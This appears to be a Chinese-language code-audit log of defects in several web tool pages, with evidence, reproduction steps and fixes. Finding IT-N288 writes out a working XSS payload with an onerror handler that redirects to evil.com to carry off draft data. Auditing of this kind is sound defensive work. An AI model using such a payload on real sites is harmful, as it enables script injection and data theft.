- `xml-to-yaml`：IT-N264（textarea 初值塞深潜 CSS/被吞 `</body>`）与 IT-N265（数组套对象输出 `[object Object]`）源码已由其他 Agent 修好且在 HEAD，清单漏销账，本批补真机证据（初值 187 字符/10 行、无 CSS、深潜容器在 textarea 外、首屏干净 YAML；嵌套数组递归输出 `d: "1"` 无 `[object Object]`）；IT-N266 真修：属性正则补单引号 `(?:"([^"]*)"|'([^']*)')`、标签头 `>` 查找加 findGt 跳过引号内字符、以 @/# 开头的键过 `yKey()` 加双引号（YAML 1.2 保留指示符/注释，加引号不影响 XML 往返）；顺带修 indent 承诺（dumpYaml 加 unit 参数，root 传空前缀、每层递增 unit，2 空格→首层 2 空格，4 空格/tab 同样对齐）。同页 en JSON 更新两条中文键/英译并清理 N264 遗留的旧深潜示例键。第209批销账；真机 22/22 vs 旧 10/22（12 项红；N264/N265 共 5 项旧态已绿如实记录），verify 无用例。N267（json-schema-generator 单样本）等仍留清单。

### IT-N267 只有单样本入口，却把所有键都写进 `required`（含 `null` 字段），与"多样本取交集"的说明矛盾（中，确认缺陷）
- 问题：`inferSchema` 对每个 key 无条件 `required.push(key)`；页面只能粘一个 JSON，不存在"所有样本"。公式清单却写"在所有样本中都出现的键才会被判定为必填"。
- 证据：`tools/it/json-schema-generator.html:429-441`（`:432` 无条件 push）、`:164`（说明）、`:206`（单个 textarea）、`:307-329`（SAMPLE 含 `metadata: null`）。
- 复现：用默认示例生成 → `required` 含 `metadata`，其 schema 为 `{type:"null",examples:[null]}`，等价于"该字段必填且只能为 null"；任何真实响应都会校验失败。期望：`null` 字段要么不进 required，要么标 `type:["null","string"]`。
- 影响：`tools/it/json-schema-generator.html`（生成的契约必然过度约束）
- 方案：支持多样本（顶层数组或多文档）取交集后再定 required，否则默认关闭该选项并删掉"多样本"文案；对 `null` 值输出 `type:["null", …]` 或直接跳过。
**留存建议（tools/it/json-schema-generator.html）**：本页最影响可用性的一条，先统一"单样本"口径再谈推断精度。

### IT-N268 "描述注释"勾选框是死控件，从不产出 `description`（中，确认缺陷）
- 问题：`optDescriptions` 的值读进 `options` 后没有任何消费点，`inferSchema` 全程不写 `description`。
- 证据：`tools/it/json-schema-generator.html:183`（控件）、`:572`（读取）、`:160`（公式说明自称"descriptions 生成说明"）、`:354-455`（推断无 `description`）、`:797`（预设"描述+极值+标题"还专门勾上它）。
- 复现：勾选与否各生成一次，`JSON.stringify(lastSchema)` 完全一致（diff 为空）；而预设 `:797` 声称会输出"描述"。
- 影响：`tools/it/json-schema-generator.html`（UI 承诺与输出不符，用户会以为功能坏了）
- 方案：实现 `description`（如 `prop.description = keyToTitle(key)` 或 `'The ' + key + ' field.'`），或删掉该复选框（成本最低）。
**留存建议（tools/it/json-schema-generator.html）**：删控件最省事，别留半截功能。

### IT-N269 混合类型数组直接退化成空 schema，没有任何 `anyOf/oneOf`（中，确认缺陷）
- 问题：`mergeSchemas` 在类型不一致时 `return {}`，于是 `items` 变成空 schema（"任意值均可"），元素类型信息全丢；同页 `:165` 却写"混合类型可用 anyOf/oneOf 表达"。
- 证据：`tools/it/json-schema-generator.html:461-481`（`:481` 返回 `{}`）、`:367-372`、`:165`。
- 复现：node 同逻辑 `mergeSchemas([{type:'integer'},{type:'string'}])` → `{}`；输入 `{"tags":[1,"a"]}` → `"tags":{"type":"array","items":{}}`，无法看出元素可为整数或字符串。期望 `items:{anyOf:[{type:"integer"},{type:"string"}]}` 或 `type:["integer","string"]`。
- 影响：`tools/it/json-schema-generator.html`
- 方案：返回 `{anyOf:[…去重同类…]}`（2020-12/draft-07 均支持），或 `{type:[...]}`；至少保留首个类型并加 `description:"mixed types in sample"` 作提示。
**留存建议（tools/it/json-schema-generator.html）**：与 N267 同批，属"推断结论丢失"。

### 承诺 vs 实际（R 批专项·8 页）
- `tools/it/qrcode.html:299`："最高版本 40 约存 2953 字节（数字模式）"——2953 是**字节模式**容量（数字模式为 7089 位），与同页 `:559` 的正确表注自相矛盾。
- `tools/it/qrcode.html:11`、`:80-81`、`:169`、`:629`：宣称"识别/解析上传图片"，实际只有生成（N259）；`:629` 还多打了一个句号"。。"。
- `tools/it/regex.html:345`、`:374`：建议用"原子组/独占量词"规避灾难性回溯——JS RegExp 两者都不支持（该建议只对 PCRE 有效），而本页正是 JS 正则测试器；且页面自述"应设超时保护"却未实现（N252）；`:654` 分享链接（N253）、`:599` 替换强制全局（N254）。
- `tools/it/xml-to-yaml.html:415-417` + `:404-405`：`indent` 选"2 空格"时首层实际 4 空格、二层 6 空格（root 传 `pad+'  '` 而 `pad` 已是 2 空格），与缩进控件承诺不符；`:209` 把 `@`/`#text` 当推荐约定（N266）；`:151` 的 FAQ 说"同名重复元素转成数组"，但单次出现时仍输出标量（`:288`、`:291-293`），形状随样本数变化。
- `tools/it/json-schema-generator.html:656-667`："验证"按钮只做 `JSON.stringify`（对普通对象不会失败），并未校验 Schema 合法性；`:500-501` `isIPv4` 不校验 0–255，`999.999.999.999`、`256.0.0.1`、`01.2.3.4` 都被标 `format:"ipv4"`（node 实测三条全 true）；`:464-476` 合并对象数组时重建 `{type,properties}`，丢掉 `required`。
- `tools/it/binary-to-text.html:203`：FAQ 关于空格/尾组的说明与实现相反（N248）；`:386` 导出的是从未填充的 `#binary_to_textTable`（N246）。
- `tools/it/hex-encode.html:284`：勾选前缀只在整串首加一个 `0x`（`0x4869`），与"每字节 0x"的常见约定不同（N261）；`:421-423` 只包 `enc`，解码不进历史（N263）。
- `tools/it/device-info.html:608-613`："复制全部信息"粘连无分隔（N257）；`:333-335` iPadOS 13+ 桌面模式 UA 只含 `Macintosh`/`Mac OS X` → 会判成 "macOS + 桌面设备"（待验证，本机无 iPad）；`:339-348` `isTouch` 取 `'ontouchstart' in window || maxTouchPoints>0`，两者可矛盾（显示"支持 (0 点)"，待验证）。
- `tools/it/regex.html` 历史只在点"常用正则"卡片时记录（`:814-816` 包装的 `applyPreset`，而 `:760` 的历史回放调 `applyPreset()` 无参 → 抛 TypeError 被吞），直接输入正则不记录；TBKit 预设条点击走 `preset.bar(n,list)` 的空参 `after`（`:812`、`js/tool-kit.js:1042-1053`）→ `applyPreset(undefined)` 抛 TypeError 被 try/catch 吞掉，toast 与历史都不生效（结果因 `setValue` 派发 `input` 事件仍会刷新）。
- 通用：本批 8 页的"导出明细 CSV"里，`binary-to-text`、`hex-encode` 两页导的是恒空的历史表（N246/N262）；`qrcode`、`device-info`、`chinese-name-generator` 的导出只在真正产生记录后才有效，无记录时无任何提示。
- 通用（隐私口径）：`device-info` 页声称"所有数据仅在浏览器本地显示，不会上传"，源码中确无 `fetch/sendBeacon`（`js/analytics.js`、`js/metrics.js` 亦无网络调用），但模板 `:73` 左右统一注入第三方 `lf1-cdn-tos.bytegoofy.com` push.js（拿到完整 DOM 权限）——"不上传"应限定为"表单数据不上传"，或移除该第三方脚本。

### 覆盖
- 实读 8 页：`tools/it/binary-to-text.html`、`tools/it/chinese-name-generator.html`、`tools/it/regex.html`、`tools/it/device-info.html`、`tools/it/qrcode.html`、`tools/it/hex-encode.html`、`tools/it/xml-to-yaml.html`、`tools/it/json-schema-generator.html`（另读了 `js/qrcode.js`、`js/common.js`、`js/tool-kit.js` 的相关片段）。
- 新增 24 条（高 5 / 中 15 / 低 4），编号 IT-N246~IT-N269；本批无重号（上一批止于 IT-N245）。
- 未覆盖说明：只审计主流程、边界与文档口径，未逐条穷举 8 页全部输入域（binary/hex 只测分隔符、长度、非法 UTF-8/BOM 与 `0x` 前缀；regex 只测 ReDoS 计时、分享链接往返、强制 g 与 1000 条上限，未逐条验证所有 flag 组合与 `u`/`v` 语义；qrcode 只验证编码字节、容量估算与导出参数，未实际扫码；xml 用页面自身函数跑 6 组用例，未覆盖命名空间/CDATA 嵌套；schema 只验证 required/anyOf/描述/ipv4/验证按钮）。姓名池统计已全量（两池各 100 项），但未统计真实重名率（跨批不查重）。
- 未做验证：未开浏览器、未构建、未跑门禁、未 git 写；结论为源码静态分析 + `node` 内存复算（临时脚本 `/tmp/audit_xml.js`、`/tmp/audit_name.js`，未落仓库）；未验证英文态 `?lang=en-US`、繁体与移动端；`IT-N251`（toast 文案）与 `device-info` 的 iPad/触摸两项标为待验证。

### IT-N270 Node 模板缺 `.env`，与"机密文件务必忽略"及示例输出相反（高，确认缺陷）
- 问题：页面三处承诺会输出 `.env` 规则（注意事项"机密文件（.env）务必忽略"、深度解析"选 Node → 输出 `node_modules/`、`dist/`、`.env` 等规则"），但 8 个模板共 29 条规则里没有任何 `.env`（只有 `env/` 目录，与 `.env` 文件完全不同）。
- 证据：`tools/it/gitignore-generator.html:219`（Node 模板 5 条，无 `.env`）、`:172`（务必忽略 `.env`）、`:382`（示例声称输出 `.env`）、`:217-226`（全量模板表）。
- 复现：node 汇总 `T` 全部 items → 29 条，`includes('.env')`、`.env.*`、`.DS_Store`、`*.log`、`coverage/` 全为 false；只勾 Node 时实际输出 `node_modules/`、`npm-debug.log*`、`yarn-error.log`、`dist/`、`.next/` 五行，无 `.env`。
- 影响：用户按页面提示以为密钥已被忽略，实际 `.env` 仍会入库；这是安全承诺落空，比多一条规则严重得多。
- 方案：Node/Python/Go 等模板统一追加 `.env`、`.env.*`、`!.env.example`（保留样例），或新增"通用/机密"模板；同时按实际输出改写 `:382` 示例，避免再写未生成的规则。
**留存建议（tools/it/gitignore-generator.html）**：最小修复是在 `T.node.items` 补 `.env` 与 `!.env.example`，并纠示例文案。

### IT-N271 "默认参数"预设把 8 个技术栈全勾上，且预设不清除旧勾选（中，确认缺陷）
- 问题：预设"默认参数"给 8 个 checkbox 全传真值；而页面真实默认只勾 Node。`setValue` 对 checkbox 执行 `f.checked = !!val`，传 `'py'/'node'/…` 均为 true。且预设只设置所列字段，不重置未列出的项，切换预设会叠加而非替换。
- 证据：`tools/it/gitignore-generator.html:344`（values 覆盖 `top_py`~`top_ide`）、`:127`（仅 `top_node` 带 `checked`）、`js/tool-kit.js:993`（`checked = !!val`）、`:235-243`（resetForm 才是全不选）。
- 复现：点"默认参数"→ 8 项全选中，输出 8 段规则；先点"默认参数"再点"Python+Node"→ 仍是 8 项全选（未列出的项保持原状）；期望"默认参数"只勾 Node、"Python+Node"只勾这两项。
- 影响：每次都要手动取消 7 项，极易生成与项目无关的大段规则；"默认参数"名不副实。
- 方案：`preset.bar` 层支持 `values` 全量赋值（未列出的 checkbox 显式置 false），或将"默认参数"改名为"全栈模板"并另加一个真正只勾 Node 的默认项。
**留存建议（tools/it/gitignore-generator.html）**：与 `js/tool-kit.js` 的 preset 语义一起改，别只改本页。

### IT-N272 历史/数据表/图表都取截断后的纯文本，图表恒空（中，确认缺陷）
- 问题：`ResText` 读 `#result` 的 `textContent` 并 `slice(0,80)`，得到 `.gitignore # Generated…` 这类非数值串；图表用 `parseFloat` 解析该串，恒为 `NaN`，`nums.length>=2` 永不成立，趋势图从不渲染；历史/数据表也只能看到前 80 字符（规则尾部被截断）。
- 证据：`tools/it/gitignore-generator.html:259-265`（ResText 截 80 字）、`:134`（结果容器）、`:299-306`（`parseFloat(arr[j].d[rk])` + `nums.length>=2` 才画图）。
- 复现：连续计算 Node、Python 两次 → 数据表两行，结果列均为 `.gitignore # Generated by ToolBox .gitignore Generator # Node.js node_modules/…` 前 80 字；图表区域始终空白，期望按选中栈数量或规则条数出趋势。
- 影响：三个辅助 tab（图表/数据表/历史）实际不可用，无法对比两套配置差异。
- 方案：历史摘要改存结构化数字（如 `{stacks: sel.length, rules: lines.length}`），或至少把 `resText` 改为读取规则条数；图表用该数值字段。
**留存建议（tools/it/gitignore-generator.html）**：历史字段别存整段文本，存 `stacks/rules` 两个计数即可。

### IT-N273 所谓"二维码"是随机噪点图，扫码器必然读不出（高，确认缺陷）
- 问题：`renderQR` 只画 3 个定位图形与一条时序线，其余 25×25 单元用 `pseudoRandom(strHash(text))` 随机 0/1 填充；没有格式信息、版本信息、数据编码、掩码与 RS 纠错码，也没有静区。它不是二维码，只是"像二维码的图案"。
- 证据：`tools/it/phone-qr.html:250-269`（`grid[r][c]=rnd()<0.5?0:1`）、`:271-277`（画布）、`:261`（仅画定位/时序）。
- 复现：输入 `13800138000` → 生成 25×25 固定噪点；同一号码两次结果一致（种子=哈希），但没有任何可解码数据区；按构造（无数据码字/纠错块）任何 QR 解码器都不可能返回 `tel:…`（未实扫，仅静态判定）。
- 影响：工具唯一核心功能不成立；页面却称"扫码唤起拨号""主流扫码器均支持"，属功能造假。
- 方案：内联/本地引入二维码编码实现（如 `qrcode` 的 QR 编码核心），按 byte 模式写入 `tel:` 载荷并补 4 模块静区；在真机上用扫码器回归一次后再上线。
**留存建议（tools/it/phone-qr.html）**：这是本页根问题，先修真 QR，再谈样式。

### IT-N274 已带 `tel:` 的输入不剥离空白，与公式声明不符（中，确认缺陷）
- 问题：公式写"去首尾空白后剥离全部空白字符"，实现只在"不以 tel: 开头"分支执行 `replace(/\s+/g,'')`；已带前缀时空白原样进入载荷与画布。
- 证据：`tools/it/phone-qr.html:158`（公式）、`:281`（`if(!/^tel:/i.test(phone)) phone='tel:'+phone.replace(/\s+/g,'')`）。
- 复现：输入 `tel:+86 138 0013 8000` → 实际载荷 `tel:+86 138 0013 8000`；期望 `tel:+8613800138000`（RFC 3966 的 visual-separator 不允许裸空格）。
- 影响：扫码/拨号端可能把空格当非法字符；同一号码因写法不同生成不同图。
- 方案：先 `phone = phone.replace(/\s+/g,'')`，再判断并补 `tel:`；同时校验只允许 `+`、数字、（可选）`;` 参数。
**留存建议（tools/it/phone-qr.html）**：顺手把 `^tel:` 判断移到清洗之后，一行顺序问题。

### IT-N275 只能复制文本、无 PNG 下载，且图案没有静区（中，确认缺陷）
- 问题：结果区只有 canvas 与"复制"按钮，复制的是 `#output` 的 `textContent`（即 `tel:` 文本），不是图片；没有 `toDataURL` 下载入口。finder 从 `i=-1` 开始但越界直接跳过，未留 4 模块静区。
- 证据：`tools/it/phone-qr.html:167`（唯一按钮"复制"）、`:288-290`（复制 textContent）、`:252-261`（无静区）、`:271-277`（canvas 未导出）。
- 复现：生成后点"复制"→ 粘贴得到 `tel:13800138000`；右键无"图片另存"菜单项，移动端只能截屏；期望得到可保存的 PNG。
- 影响：二维码无法用于名片/海报/打印；即使换成真 QR，缺静区也会降低识别率。
- 方案：加"下载 PNG"按钮（`canvas.toDataURL('image/png')`），画布四周留 4 模块白边。
**留存建议（tools/it/phone-qr.html）**：下载按钮是本页第二刚需，与真 QR 一起补。

### IT-N276 `map<...>` 字段直接把整份 .proto 解析打断（高，确认缺陷）
- 问题：`parseField` 把 `map` 当普通类型，随后把 `<` 当字段名、把 `string` 当"期望 ;"的位置，抛错终止整文件；`oneof` 内的 map 同样不支持。proto3/gRPC 里 map 极常见。
- 证据：`tools/it/protobuf-parser.html:287-306`（`:290` 取 type、`:292` 取 name、`:305` `expect(';')`）、`:308-323`（oneof 同样无 map 分支）。
- 复现：输入 `message M { map<string, Address> tags = 1; }` → 实际 `❌ 期望 ;`，输出为空；期望 `{type:'map', keyType:'string', valueType:'Address', name:'tags', number:1}`。
- 影响：含 map 的 .proto（业务消息几乎必有）整体解析失败，工具不可用。
- 方案：`parseField` 先判 `map`，消费 `<`、keyType、`,`、valueType、`>`，再读字段名/编号；同时补 `extensions`/`extend` 分支。
**留存建议（tools/it/protobuf-parser.html）**：优先修 map，这是覆盖面最大的解析缺口。

### IT-N277 "校验"只数括号，任意非法文本都报"语法正确"（高，确认缺陷）
- 问题：`doValidate` 仅对 token 做 `{}[]()` 深度计数，完全不调用解析器；`message X { int a }`、`hello world`、甚至空文件都会通过。
- 证据：`tools/it/protobuf-parser.html:404-417`（`:407-414` 只算 depth，`:415` 输出"✅ .proto 语法正确"）、对比 `:278-393` 真正解析逻辑。
- 复现：输入 `message X { int a }`（缺 `=` 与编号）→ 实际 `✅ .proto 语法正确 / Tokens: 9 / 括号平衡`；输入 `not proto at all` → 同样通过；期望报"字段缺少 = 或 ;"。
- 影响：用户误以为文件合法，掩盖真实语法错误，比不校验更危险。
- 方案：校验直接复用 `parseProto()` 的成功/异常路径（try 内成功才报 ✅），抛错时带 token 序号或行号。
**留存建议（tools/it/protobuf-parser.html）**：删除括号计数实现，别维护两套语法判断。

### IT-N278 页面宣称解析"二进制编码结构"，实现只做 .proto 文本转 JSON（中，确认缺陷）
- 问题：`formula-desc` 写"解析 Protocol Buffers 的二进制编码结构"，深度解析两条都写"按 .proto 解析二进制消息/抓包排查 gRPC"，但代码只 `tokenizeProto` 文本并 `JSON.stringify` 结构，没有 varint、字段号、wire type、长度前缀的任何解码。标题"Protobuf 解析器"也易被理解为二进制解析。
- 证据：`tools/it/protobuf-parser.html:161`（二进制结构）、`:204-205`（解析二进制消息/抓包）、`:278-281`（只读 `#input` 文本）、`:391`（输出 JSON 结构）。
- 复现：输入一段真实 wire bytes（如 `08 96 01`）→ 实际 `❌ 期望 {` 或空结构；期望得到 `field 1 varint = 150`。
- 影响：按"抓包排查 gRPC"来的用户完全用不了；标题与 meta（`:12` 写"解析 .proto 文件为 JSON"）又自相矛盾。
- 方案：二选一——把文案统一改为".proto → JSON 结构解析"并改标题为"Proto 结构解析器"；或真正实现 wire format 解码（varint/zigzag/fixed/length-delimited + 字段号树）。
**留存建议（tools/it/protobuf-parser.html）**：本批最大口径偏差，先统一命名与文案，再决定是否做二进制。

### IT-N279 历史/数据表/图表取到静态"算法说明"卡片，记录恒定、图表恒空（中，确认缺陷）
- 问题：`ResText` 用 `document.querySelector('.result-box')` 取到页面第一个 `.result-box`——`:184` 的算法说明卡，而非 `#results` 的结果卡。该文本永不变，历史只记一条后因 `last` 相同不再新增；图表 `parseFloat('HMAC (Hash-based…')` → `NaN`，永不渲染。
- 证据：`tools/it/hmac-generator.html:184`（首个 `result-box` 是说明卡）、`:187`（真正的 `#results` 容器）、`:340-347`（querySelector 选择器）、`:305`（`previousElementSibling` 复制逻辑，仅供对照）。
- 复现：以 `secret-key` 对 `hello`、`world` 各算一次 → 历史仍只有一条，内容是 `HMAC (Hash-based Message Authentication Code) 用于验证消息完整性和真实性。 公式：HMAC(K, m) = …`；数据表只有这一行；图表空白。期望每条记录含 key/msg 与四档摘要。
- 影响：三个辅助 tab 全部失效，无法比对两次签名。
- 方案：`ResText` 改为读 `#results` 的第一个 `.hmac-card .val`（或拼接四档），历史摘要存 `{algo: hex}`；图表不要对摘要做 `parseFloat`。
**留存建议（tools/it/hmac-generator.html）**：选择器改成 `#results` 即可，别再依赖页面首个 `.result-box`。

### IT-N280 密钥只能按 UTF-8 文本处理，无法按 hex/Base64 解释（中，确认缺陷）
- 问题：`getKeyBytes` 直接 `new TextEncoder().encode(key)`，把 `0x0b0b…`、Base64 `a2V5` 都当普通字面量；页面 FAQ 却把"编码不一致（hex vs Base64）"列为签名对不上的三大原因之一，工具本身没有任何编码选项。
- 证据：`tools/it/hmac-generator.html:263-264`（TextEncoder）、`:219`（FAQ 编码原因）、`:151`（输出长度说明，未涉及输入编码）。
- 复现：后端密钥为 16 字节 `0x0b0b…`，输入 `0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b` → 实际按 32 个 ASCII 字符计算，HMAC 与后端不符；输入 Base64 `a2V5` → 按 4 字符 `a2V5` 计算；期望按字节解码。
- 影响：对接 Webhook/API 签名时结果永远对不上，且页面给出的排查建议无法执行。
- 方案：密钥区加"文本 / hex / Base64"选择，hex/base64 走 `Uint8Array`；输出同时给 hex 与 Base64 两种格式。
**留存建议（tools/it/hmac-generator.html）**：加编码选择器比补文档更有效，顺带补 Base64 输出。

### IT-N281 "默认参数"预设只改 key，不重算，复制的是旧卡片（低，确认缺陷）
- 问题：预设 `after` 回调是 `copyAll()`，而 `copyAll` 只读现有 `.hmac-card` 并复制；`key` 输入没有 `oninput`，`setValue` 派发的 `input` 不会触发 `calc`。点击"默认参数"后卡片仍是上一次的摘要，toast 还说"已复制全部 HMAC"。
- 证据：`tools/it/hmac-generator.html:167`（key 无 oninput）、`:425`（默认参数只设 key）、`:428`（after=copyAll）、`:430-432`（预设后包装 copyAll 触发 extras）。
- 复现：先算 `hello`/`secret-key`，再点"默认参数"（key 变 `secret-key`）→ 卡片摘要不变（仍是旧 key 的结果），剪贴板也是旧值；期望立即按新 key 重算。
- 影响：预设给出并复制过期签名，属"看起来成功、实际错误"。
- 方案：`after` 改为 `calc()`（async 可 `void calc()`），预设内不要复制；`key` 加 `oninput="calc()"` 或 debounce。
**留存建议（tools/it/hmac-generator.html）**：预设回调一律指向计算函数，不要指向复制函数。

### IT-N282 编码丢弃所有非字母（含数字/标点/重音字母），与"非字母原样保留"相反（中，确认缺陷）
- 问题：`enc` 的 map 对非 `A-Z` 一律 `return ''` 并 `filter` 掉，数字、标点、空格内标点、`é` 等全部消失；整词都是非字母时产生空词，`join(wordSep)` 后留下多余分隔符。
- 证据：`tools/it/a1z26-cipher.html:147`（"非字母字符原样保留"）、`:259-262`（非字母返回空串并过滤）、`:264`（空词仍参与 join）。
- 复现（node 同逻辑）：`hello 42!` → `8-5-12-12-15/`（尾随 `/`，`42!` 成空词）；`café` → `3-1-6`（`É` 被丢）；期望保留 `42!` 或至少提示"已忽略 4 个非字母字符"。
- 影响：原文不可逆（数字/标点永久丢失），且输出出现 `//` 之类异常分隔，接收方无法判断是数据还是空词。
- 方案：非字母原样写入并保留词边界；或过滤空词后统计"忽略数"并 toast/结果区提示；如需支持重音字母，先 `normalize('NFD')` 去组合符。
**留存建议（tools/it/a1z26-cipher.html）**：与 N283 一起改口径，别再"文档说保留、代码全丢"。

### IT-N283 解码对越界数字静默跳过，与"超出 1–26 视为非法输入"不符（中，确认缺陷）
- 问题：`dec` 只在 `v>=1 && v<=26` 时输出字母，其余既不入结果也不报错；`parseInt` 还会把 `12a`、`1e2` 截成合法数字。
- 证据：`tools/it/a1z26-cipher.html:149`（非法输入声明）、`:274-279`（越界静默跳过、`parseInt` 无整串校验）。
- 复现（node 同逻辑）：`1-99-2` → 实际 `AB`；`12a-3` → 实际 `LC`；期望报"99 超出 1–26"或输出 `A?B` 标出非法项。
- 影响：错误输入得到看似正常的结果，用户无法发现数据损坏；与页面自己的解码说明冲突。
- 方案：先按 `/^\d+$/` 校验每个 token，越界或非纯数字时抛错并在结果中定位（如 `第 2 项 99 非法`）。
**留存建议（tools/it/a1z26-cipher.html）**：解码入口加一次 token 校验，成本很低。

### IT-N284 历史/数据表/图表读 textarea 的 textContent（恒空），三个 tab 永远无数据（中，确认缺陷）
- 问题：输出是 `<textarea id="output">`，代码写 `.value`，但 `ResText` 读 `.textContent`——textarea 的 textContent 是初始子节点（空），因此摘要恒 `''`，`history.record` 直接 return；图表也没有数据。
- 证据：`tools/it/a1z26-cipher.html:183`（`textarea#output`）、`:323-329`（读 `r.textContent`）、`:264`/`:283`（写的是 `.value`）。
- 复现：编码 `hello` 后 → 历史 0 条、数据表 0 行、图表空白；期望至少记录输入与输出摘要。
- 影响：历史/对比/趋势全部不可用（与本批 N246/N262/N272/N279 同类问题）。
- 方案：`ResText` 改用 `r.value`；图表若要数值，另存字符数/词数。
**留存建议（tools/it/a1z26-cipher.html）**：`textContent`→`value` 一行修复，顺带检查同模板其它页。

### IT-N285 首尾字母取原始 token（含标点），带标点的词输出乱码（中，确认缺陷）
- 问题：`numeronym` 用 `w[0]` / `w[w.length-1]` 而不是去掉非字母后的 `alpha` 首尾；`internationalization,` 的尾字符是逗号，`(internationalization)` 的首尾是括号。
- 证据：`tools/it/numeronym-generator.html:260-264`（`:262` 用 `alpha.length` 判长、`:263` 却取 `w[0]/w[len-1]`）。
- 复现（node 同逻辑）：`internationalization,` → `i18,`；`internationalization.` → `i18.`；`(internationalization)` → `(18)`；期望均为 `i18n`。
- 影响：整段文本里带标点的词（句末、括号、引号）全部输出错误，且"复制结果"会把乱码带出去。
- 方案：`return alpha[0] + (alpha.length-2) + alpha[alpha.length-1]`，并保留原词前后的标点（如 `i18n,`）。
**留存建议（tools/it/numeronym-generator.html）**：一行改 `alpha` 首尾即可覆盖 90% 场景。

### IT-N286 对所有 ≥3 字母词都缩写，无 7 字母阈值，整段散文变得不可读（中，确认缺陷）
- 问题：文档口径"通常 7 字母以上才用"，实现只要字母数 >2 就缩写；`the`→`t1e`、`cat`→`c1t`，整段普通英文被改成缩写串，且没有最小长度选项。
- 证据：`tools/it/numeronym-generator.html:262`（`alpha.length<=2` 才豁免）、`:193`（"通常 7 字母以上才用"）、`:124`（示例输入为长词，掩盖了短词问题）。
- 复现（node 同逻辑）：`the quick brown fox` → `t1e q3k b3n f1x`；期望短词原样保留（`the quick brown fox`）。
- 影响：段落级转换结果不可用，用户需手工挑词；与页面自述阈值矛盾。
- 方案：加"最小字母数"输入（默认 7），`alpha.length < min` 原样返回；或提供"仅转换已知长词"模式。
**留存建议（tools/it/numeronym-generator.html）**：默认 7 与文档对齐，示例补一条短词对照。

### IT-N287 "复制结果"复制的是逐词对照，不是展示结果；空结果 toast 为 undefined（低，确认缺陷）
- 问题：大号展示区 `#outBig` 是最终缩写串，`#output` 是逐词对照表；`copyOut` 复制 `#output`。空值时 `i18nText()` 未传参，`i18nText` 返回 `undefined`，`showToast(undefined)` 会显示空/`undefined` 文案。
- 证据：`tools/it/numeronym-generator.html:127`（`#outBig` 结果）、`:128`（`#output` 对照）、`:272-277`（分别写入）、`:131`（按钮文案"复制结果"）、`:259`（`i18nText()` 无参）。
- 复现：输入 `internationalization` → 点"复制结果"→ 粘贴得到 `internationalization → i18n`；期望 `i18n`。清空后点复制 → toast 内容为空/undefined。
- 影响：复制内容与所见不一致，用户易把对照表贴进文档。
- 方案：复制 `#outBig.textContent`（为空时提示"请输入文本"），并给 `i18nText` 传具体 key 或 fallback 字符串。
**留存建议（tools/it/numeronym-generator.html）**：复制源切到 `#outBig`，与页面主展示一致。

### IT-N288 预览/导出存在属性注入型 XSS（图片 alt、链接 URL 未转义）（高，确认缺陷）
- 问题：解析器只转义 `<`/`>`/`&`，随后用模板拼 `<img src="$2" alt="$1">`、`<a href="$2" …>`；URL 与 alt 中的 `"` 未转义，可直接闭合属性并注入事件处理器。文档自己写着"必须过滤内嵌 HTML，防止 XSS"，但没有任何净化。
- 证据：`tools/it/markdown-editor.html:759`（图片拼接）、`:762`（链接拼接）、`:710-712`（只转义三个字符）、`:527`（安全声明）、`:938`（`preview.innerHTML=html`）。
- 复现（node 照抄两条正则）：输入 `![a" onerror="location.href='//evil.com'](x)` → 实际输出 `<img src="x" alt="a" onerror="location.href='//evil.com'">`；预览加载即执行 `location.href`，可外带 `localStorage['toolbox_md_draft']` 中的草稿。期望输出实体化后的 `alt="a&quot; onerror=…"` 纯文本。
- 影响：粘贴不可信 Markdown（README/Issue/聊天记录）即可执行任意 JS；导出 .html 后同样带毒。
- 方案：属性值统一走 `escAttr`（`"`→`&quot;`、`'`→`&#39;`），URL 做协议白名单（仅 http/https/mailto，禁 `javascript:`/`data:`），并本地引入 DOMPurify 做最后一道白名单净化。
**留存建议（tools/it/markdown-editor.html）**：XSS 是本页最高优先，先补 `escAttr`+协议白名单，再谈语法扩展。

### IT-N290 `#` 与 `##` 都渲染成 h2，预览与导出都没有 h1（低，确认缺陷）
- 问题：`^#\s+` 被映射为 `<h2>`，与 `^##\s+` 相同，文档级一级标题在预览/导出 HTML 中不存在；这与 CommonMark 的 h1 语义不符，导出到别处层级整体下移。
- 证据：`tools/it/markdown-editor.html:735-736`（两条都输出 `<h2>`）、`:521`（公式里明确写"# 与 ## 均输出 h2"，属有意为之）、`:203`（CSS 备了 h1 样式却用不到）。
- 复现：输入 `# 标题` → 预览 `<h2>标题</h2>`；期望 `<h1>标题</h1>`。
- 影响：复制到 GitHub/博客后大纲层级错误；页面 h1 样式成为死代码。
- 方案：`#` 映射 h1（预览容器内无冲突），保留 `##`→h2；同步改 `:521` 文案。
**留存建议（tools/it/markdown-editor.html）**：改一行正则 + 改一句说明即可。

### IT-N291 clamp 表达式算错：最小视口得到"首选字号"，大范围还会提前封顶（高，确认缺陷）
- 问题：斜率用 `(pref-min)/(vwMin/100)` 与 `(max-min)/(vwMax/100)` 取 `max`，截距用 `pref - vw*vwMin/100`——等于把直线锚在 `(vwMin, pref)`，最小视口永远输出 `pref` 而非 `min`；当 `pref` 接近 `min` 时斜率取 `slope2` 也不对。正确应为 `(max-min)/(vwMax-vwMin)*100`、`min - slope*vwMin/100`。
- 证据：`tools/it/clamp-calculator.html:275-279`（斜率/截距/表达式）、`:288-294`（预览另走 `min+(max-min)*t`）。
- 复现（node 照抄）：默认 16/24/48 @375–1440 → 实际 `clamp(16px, 2.22vw + 15.67px, 48px)`，375px 得 **24px**（期望 16）、1440 得 47.67；16/20/24 @375–1440 → `1.07vw + 16px`，375=20、约 750px 即触顶 24，全程不出现 16。正确式应为 `clamp(16px, 3vw + 4.73px, 48px)`（375=16、1440=48）。
- 影响：复制到站点的字号在小屏偏大、大屏提前封顶，完全不是用户设定的 min→max 区间。
- 方案：改用正确斜率/截距，并校验 `min ≤ pref ≤ max`；`pref` 仅在需要"中点偏好"时按分段函数使用，不能当直线锚点。
**留存建议（tools/it/clamp-calculator.html）**：本页核心公式错误，优先修 `:275-278`。

### IT-N292 滑块预览完全忽略"首选字号"，与生成表达式不一致（中，确认缺陷）
- 问题：`slide` 用 `min+(max-min)*t` 线性插值，`pref` 输入不参与；而表达式按 `pref` 锚定。用户拖动滑块看到的是"正确"的 min→max，复制出去却是另一条线；改 `pref` 时预览毫无变化。
- 证据：`tools/it/clamp-calculator.html:285-294`（预览只读 min/max/vwMin/vwMax）、`:169`（文档示例"16–24 @320–1280"）、`:269-273`（pref 参与表达式）。
